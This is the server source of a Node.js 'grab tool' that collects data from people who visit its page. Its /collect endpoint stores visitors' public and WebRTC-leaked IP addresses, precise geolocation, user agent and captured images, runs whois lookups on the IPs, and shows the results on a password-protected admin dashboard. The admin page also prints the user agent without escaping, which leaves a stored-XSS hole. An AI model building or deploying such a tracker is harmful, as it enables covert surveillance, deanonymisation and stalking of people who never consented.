const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const net = require('net');
const { exec } = require('child_process');

const PORT = 3000;

// --- Directories ---
const PUBLIC_DIR = path.join(__dirname, 'public');
const IMAGE_DIR  = path.join(__dirname, 'images');
if (!fs.existsSync(IMAGE_DIR)) fs.mkdirSync(IMAGE_DIR);

const DATA_FILE = path.join(__dirname, 'data.json');
const CONFIG_FILE = path.join(__dirname, 'config.json');
if (!fs.existsSync(CONFIG_FILE)) {
  console.error('Config file not found. Run pass.py first.');
  process.exit(1);
}
const CONFIG = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8'));

// --- Helper: safely serve static files ---
function serveStatic(baseDir, reqPath, res, contentType = null) {
  try {
    const decodedPath = decodeURIComponent(reqPath);
    const absPath = path.resolve(baseDir, '.' + decodedPath);

    if (!absPath.startsWith(baseDir)) {
      res.writeHead(403);
      return res.end('Forbidden');
    }

    if (!fs.existsSync(absPath) || !fs.statSync(absPath).isFile()) {
      res.writeHead(404);
      return res.end('Not found');
    }

    if (!contentType) {
      if (absPath.endsWith('.js')) contentType = 'application/javascript';
      else if (absPath.endsWith('.css')) contentType = 'text/css';
      else if (absPath.endsWith('.png')) contentType = 'image/png';
      else contentType = 'text/html';
    }

    res.writeHead(200, { 'Content-Type': contentType + '; charset=utf-8' });
    fs.createReadStream(absPath).pipe(res);
  } catch (e) {
    res.writeHead(400);
    res.end('Bad request');
  }
}

// --- Utility: IP helpers ---
function isPublicIP(ip) {
  if (net.isIP(ip) === 4) {
    return !(
      /^10\./.test(ip) ||
      /^192\.168\./.test(ip) ||
      /^172\.(1[6-9]|2\d|3[0-1])\./.test(ip) ||
      /^127\./.test(ip) ||
      /^169\.254\./.test(ip)
    );
  }
  if (net.isIP(ip) === 6) {
    const s = ip.toLowerCase();
    return !(s === '::1' || s.startsWith('fc') || s.startsWith('fd') || s.startsWith('fe80'));
  }
  return false;
}

function runWhois(ip, cb) {
  exec(`whois "${ip}"`, { timeout: 10000, maxBuffer: 1024 * 1024 }, (err, stdout) => {
    cb(err ? `WHOIS error: ${err.message}` : stdout);
  });
}

function ipLabel(ip, type) {
  const version = net.isIP(ip) === 4 ? 'IPv4' : 'IPv6';
  if (isPublicIP(ip)) {
    return `<span style="color:#0ff;">[PUBLIC ${type} ${version}]</span> <span style="color:#0f0;">${ip}</span>`;
  } else {
    return `<span style="color:#ff0;">[LOCAL ${type} ${version}]</span> <span style="color:#0f0;">${ip}</span>`;
  }
}

// --- Save record ---
function saveRecord(record) {
  let arr = [];
  if (fs.existsSync(DATA_FILE)) {
    try {
      const raw = fs.readFileSync(DATA_FILE, 'utf8');
      arr = raw.trim() ? JSON.parse(raw) : [];
    } catch (e) { arr = []; }
  }
  arr.push(record);
  fs.writeFileSync(DATA_FILE, JSON.stringify(arr, null, 2));
}

// --- Server ---
const server = http.createServer((req, res) => {
  let clientIP = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').replace(/^::ffff:/,'');

  // --- Serve images ---
  if (req.url.startsWith('/images/')) {
    return serveStatic(IMAGE_DIR, req.url.replace('/images',''), res, 'image/png');
  }

  // --- Serve user page ---
  if (req.url === '/' || req.url === '/user.html') {
    return serveStatic(PUBLIC_DIR, '/user.html', res, 'text/html');
  }

  // --- Collect POST data ---
  if (req.url === '/collect' && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      try {
        const data = JSON.parse(body);
        let record = {
          timestamp: new Date().toISOString(),
          serverObservedIP: clientIP,
          externalPublicIP: data.publicIP || null,
          webrtcIPs: data.webrtcIPs || [],
          geolocation: data.geolocation || null,
          userAgent: data.userAgent || '',
          whois: {},
          imageFile: null,
          saved: false
        };

        // Save image if provided
        if (data.image) {
          const imgName = `capture_${Date.now()}.png`;
          fs.writeFileSync(path.join(IMAGE_DIR, imgName), Buffer.from(data.image, 'base64'));
          record.imageFile = imgName;
        }

        // Public IPs for WHOIS
        const ips = [];
        if (record.externalPublicIP && isPublicIP(record.externalPublicIP)) ips.push(record.externalPublicIP);
        record.webrtcIPs.forEach(ip => { if (isPublicIP(ip)) ips.push(ip); });

        const finalize = () => {
          if (!record.saved) {
            record.saved = true;
            saveRecord(record);
            res.writeHead(200, {'Content-Type':'application/json'});
            res.end(JSON.stringify({status:'ok'}));
          }
        };

        if (ips.length === 0) {
          finalize();
        } else {
          let pending = ips.length;
          ips.forEach(ip => {
            runWhois(ip, out => {
              record.whois[ip] = out;
              pending--;
              if (pending === 0) finalize();
            });
          });
          // Fallback save after 5s
          setTimeout(finalize, 5000);
        }

      } catch (e) {
        res.writeHead(400);
        res.end('bad json');
      }
    });
    return;
  }

  // --- Admin page ---
  if (req.url === '/admin') {
    if (!['127.0.0.1','::1'].includes(clientIP)) {
      res.writeHead(403);
      return res.end('Forbidden: admin only accessible from localhost');
    }

    const auth = req.headers['authorization'] || '';
    if (!auth.startsWith('Basic ')) {
      res.writeHead(401, { 'WWW-Authenticate': 'Basic realm="Admin"' });
      return res.end('Auth required');
    }

    const creds = Buffer.from(auth.split(' ')[1], 'base64').toString().split(':');
    if (creds.length < 2) {
      res.writeHead(401, { 'WWW-Authenticate': 'Basic realm="Admin"' });
      return res.end('Invalid credentials');
    }

    const [inputUser, inputPass] = creds;
    const [salt, key] = CONFIG.adminHash.split(':');
    const hash = crypto.scryptSync(inputPass, salt, 64).toString('hex');
    const valid = crypto.timingSafeEqual(Buffer.from(hash,'hex'), Buffer.from(key,'hex'));

    if (inputUser !== CONFIG.adminUser || !valid) {
      res.writeHead(401, { 'WWW-Authenticate': 'Basic realm="Admin"' });
      return res.end('Invalid credentials');
    }

    // --- Render last 20 records ---
    let dataArr = [];
    if (fs.existsSync(DATA_FILE)) {
      try { dataArr = JSON.parse(fs.readFileSync(DATA_FILE,'utf8')); } 
      catch(e) { dataArr = []; }
    }
    dataArr = dataArr.slice(-20);

    let out = '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Admin</title><style>'+
      'body{background:#000;color:#0f0;font-family:monospace;text-align:center;}' +
      '.record{border:2px solid #0f0;margin:10px auto;padding:15px;width:95%;max-width:700px;border-radius:5px;text-align:left;}' +
      '.record h2{color:#0f0;font-size:1.8em;margin-bottom:5px;}' +
      '.label{color:#7fff7f; font-weight:bold;}' +        
      '.prebox{background:#010;color:#0f0;padding:5px;overflow:auto;white-space:pre-wrap;word-wrap:break-word;max-height:200px;border:1px solid #0f0;border-radius:3px;}' +
      'a.geo{color:#00f;}' +
      'img{max-width:90%;height:auto;margin:10px 0;display:block;margin-left:auto;margin-right:auto;}' +
      '@media(max-width:600px){.record{width:95%;padding:10px;}}'+
      `</style></head><body><h1 style="color:#0f0;">Console's Grab tool</h1>`;

    dataArr.forEach((rec,i)=>{
      out += `<div class="record"><h2>Record ${i+1} (${rec.timestamp})</h2>`;
      out += `<span class="label" style="color:#ff0;">Server Connection IP:</span> <span style="color:#0f0;">${rec.serverObservedIP}</span><br>`;
      out += `<span class="label" style="color:#0ff;">Public WAN IP:</span> <span style="color:#0f0;">${rec.externalPublicIP || 'N/A'}</span><br>`;
      out += `<span class="label">User-Agent:</span> <pre class="prebox">${rec.userAgent}</pre>`;
      if (rec.geolocation) {
        out += `<span class="label">Geolocation:</span> <a class="geo" target="_blank" href="https://maps.google.com/?q=${rec.geolocation.lat},${rec.geolocation.lng}">${rec.geolocation.lat},${rec.geolocation.lng}</a> <span>(±${rec.geolocation.acc}m)</span><br>`;
      }
      if (rec.webrtcIPs?.length) {
        out += `<span class="label">WebRTC Discovered:</span> <pre class="prebox">`;
        rec.webrtcIPs.forEach(ip=>{ out += ipLabel(ip,"WebRTC") + "\n"; });
        out += `</pre>`;
      }
      if (rec.imageFile) out += `<span class="label">Captured Image:</span><br><img src="/images/${rec.imageFile}"><br>`;
      if (rec.whois) {
        for (let [ip,w] of Object.entries(rec.whois)) {
          let preview = w.length>1000?w.slice(0,1000)+"\n[truncated]":w;
          out += `<h3 style="color:#0f0;">WHOIS for ${ip}</h3><pre class="prebox">${preview}</pre>`;
        }
      }
      out += `</div>`;
    });

    out += '</body></html>';
    res.writeHead(200, { 'Content-Type':'text/html; charset=utf-8' });
    return res.end(out);
  }

  // --- 404 fallback ---
  res.writeHead(404);
  res.end('Not found');
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running at http://localhost:${PORT}/`);
});
